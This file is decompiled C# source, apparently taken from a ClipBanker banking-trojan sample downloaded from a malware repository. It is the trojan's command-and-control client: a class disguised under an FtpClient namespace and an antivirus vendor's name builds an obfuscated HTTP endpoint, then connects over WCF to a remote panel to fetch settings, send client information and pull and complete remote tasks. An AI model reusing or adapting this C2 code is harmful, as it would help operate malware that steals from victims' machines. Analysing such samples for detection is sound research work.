// Decompiled with JetBrains decompiler
// Type: FtpClient.Data.Core.AhnLabIdiNaxui
// Assembly: Baignoire, Version=12.5.1.3, Culture=neutral, PublicKeyToken=null
// MVID: 0AA7C5E4-9380-4A35-BE75-5D7E722D7BE8
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-4d94148f1dff68b03896e3fa5508c5b039b0a29b1fd90db01884137f2e9495a4.exe

using FtpClient.Data.Helpers;
using FtpClient.Models.Core;
using FtpClient.Models.Info;
using Microsoft.CSharp.RuntimeBinder;
using System;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.ServiceModel;
using System.ServiceModel.Channels;

namespace FtpClient.Data.Core
{
  public class AhnLabIdiNaxui : ICommunicator, IDisposable
  {
    private IRemotePanel AhnLab;

    public static bool Run(Action action)
    {
      action();
      return true;
    }

    public bool Connect(string address)
    {
      try
      {
        this.AhnLab = (IClientChannel) new ChannelFactory<IRemotePanel>((Binding) SystemInfoHelper.CreateBind()).CreateChannel(new EndpointAddress(string.Format(new string(new char[11]
        {
          'h',
          't',
          't',
          'p',
          ':',
          '/',
          '/',
          '{',
          '0',
          '}',
          '/'
        }), (object) address))) as IRemotePanel;
        return true;
      }
      catch
      {
        return false;
      }
    }

    public bool TryGetSettings(out InfoClass10 settings)
    {
      try
      {
        settings = new InfoClass10();
        settings = this.AhnLab.GetSettings();
        return true;
      }
      catch (Exception ex)
      {
        Console.WriteLine((object) ex);
        Console.ReadLine();
        settings = new InfoClass10();
        return false;
      }
    }

    public bool TryReport(object lol)
    {
      try
      {
        // ISSUE: reference to a compiler-generated field
        if (AhnLabIdiNaxui.\u003C\u003Eo__4.\u003C\u003Ep__0 == null)
        {
          // ISSUE: reference to a compiler-generated field
          AhnLabIdiNaxui.\u003C\u003Eo__4.\u003C\u003Ep__0 = CallSite<Action<CallSite, IRemotePanel, object>>.Create(Binder.InvokeMember(CSharpBinderFlags.ResultDiscarded, "SendClientInfo", (IEnumerable<System.Type>) null, typeof (AhnLabIdiNaxui), (IEnumerable<CSharpArgumentInfo>) new CSharpArgumentInfo[2]
          {
            CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null),
            CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null)
          }));
        }
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        AhnLabIdiNaxui.\u003C\u003Eo__4.\u003C\u003Ep__0.Target((CallSite) AhnLabIdiNaxui.\u003C\u003Eo__4.\u003C\u003Ep__0, this.AhnLab, lol);
        return true;
      }
      catch (Exception ex)
      {
        Console.WriteLine((object) ex);
        Console.ReadLine();
        return false;
      }
    }

    public bool TryGetTasks(InfoClass1 user, out IList<InfoClass2> remoteTasks)
    {
      try
      {
        remoteTasks = this.AhnLab.GetTasks(user);
        return true;
      }
      catch (Exception ex)
      {
        Console.WriteLine((object) ex);
        Console.ReadLine();
        remoteTasks = (IList<InfoClass2>) new List<InfoClass2>();
        return false;
      }
    }

    public bool TryCompleteTask(InfoClass1 user, int taskId)
    {
      try
      {
        this.AhnLab.CompleteTask(user, taskId);
        return true;
      }
      catch (Exception ex)
      {
        Console.WriteLine((object) ex);
        Console.ReadLine();
        return false;
      }
    }

    public void Dispose()
    {
      this.Dispose(true);
      GC.SuppressFinalize((object) this);
    }

    protected virtual void Dispose(bool managed)
    {
      if (!managed || this.AhnLab == null)
        return;
      if (this.AhnLab is IClientChannel ahnLab1)
        ahnLab1.Close();
      if (this.AhnLab is IClientChannel ahnLab2)
        ahnLab2.Abort();
    }
  }
}
